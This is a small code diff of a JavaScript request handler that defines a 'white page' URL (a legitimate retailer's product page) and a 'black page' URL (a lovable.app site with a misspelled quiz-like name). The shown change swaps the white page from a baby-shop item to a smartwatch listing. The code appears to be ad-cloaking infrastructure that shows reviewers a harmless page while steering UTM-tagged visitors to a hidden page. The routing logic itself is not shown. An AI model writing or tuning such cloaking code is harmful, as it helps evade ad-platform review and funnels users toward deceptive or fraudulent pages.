@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babyshop.de/Meal-Time/Childrens-Tableware/Done-by-Deer-thermal-bottle-Playground-Green-340ml::66421.html";
+    const whitePageURL = "https://www.emporiamobile.com/en/products/watchbasic-smartwatch";
     const blackPageURL = "https://instentquzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
